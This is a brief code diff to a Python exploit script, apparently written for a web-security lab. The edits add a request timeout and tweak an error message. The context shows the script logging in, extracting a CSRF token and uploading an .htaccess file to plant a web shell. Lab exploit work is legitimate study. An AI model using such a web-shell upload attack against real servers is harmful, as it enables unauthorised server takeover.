@@ -25,7 +25,7 @@ def login(url, session):
 
 
 def upload_file(url, session):
-    response = session.get(f"{url}/my-account")
+    response = session.get(f"{url}/my-account", timeout=10)
     csrf_token = extract_csrf_token(response)
 
     htaccess_file = {
@@ -64,7 +64,7 @@ def main():
 
         print("(+) Logging in...")
         if not login(url, session):
-            print("Something went wrong. Check your URL and try again.")
+            print("(-) Something went wrong. Check your URL and try again.")
             sys.exit(1)
 
         print("(+) Uploading webshell...")
